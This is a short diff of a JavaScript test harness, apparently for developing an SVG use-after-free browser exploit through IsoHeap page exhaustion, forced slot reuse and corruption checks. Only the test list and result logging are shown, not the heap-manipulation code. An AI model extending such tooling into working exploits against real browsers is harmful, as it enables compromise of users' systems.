+  log('SVG UAF v21 - IsoHeap page exhaustion + forced slot reuse', 'inf');
+  sep();
 
   var results = {};
   var tests = [
-    ['RUS_isoheap_reuse',    runRUS],
-    ['COR_live_corruption',  runCOR],
-    ['VTP_vtable_adjacent',  runVTP],
-    ['OFS_offset_map',       runOFS],
-    ['CNF_confirm_primitive',runCNF]
+    ['EXH_page_exhaust',   runEXH],
+    ['RUS_forced_reuse',   runRUS],
+    ['COR_live_corrupt',   runCOR],
+    ['SCN_threshold_scan', runSCN]
   ];
 
   for (var i = 0; i < tests.length; i++) {
@@ -518,23 +482,21 @@ async function runAll() {
       log('[!] ' + lbl + ': ' + e, 'bad');
       results[lbl] = null;
     }
-    log('', '');
+    log('');
   }
 
   sep();
-  log('SUMMARY v20', 'inf');
+  log('SUMMARY v21', 'inf');
   sep();
-
   var keys = Object.keys(results);
   for (var ki = 0; ki < keys.length; ki++) {
     var k = keys[ki];
     var r = results[k];
     if (!r) { log('  ' + k + ': ERROR', 'bad'); continue; }
-    var v = r.reuse_at !== undefined ? r.reuse_at :
-            r.corruptionConfirmed !== undefined ? r.corruptionConfirmed :
-            r.vtpHit !== undefined ? r.vtpHit :
-            r.groups !== undefined ? r.groups.length :
-            r.confirmed !== undefined ? r.confirmed : '?';
+    var v = r.found_threshold !== undefined ? r.found_threshold :
+            r.reuse_confirmed !== undefined ? r.reuse_confirmed :
+            r.corruptConfirmed !== undefined ? r.corruptConfirmed :
+            r.threshold !== undefined ? r.threshold : '?';
     var cls = (typeof v === 'number' && v > 0) || v === true ? 'bad' : 'dim';
     log('  ' + k + ': key=' + v, cls);
   }
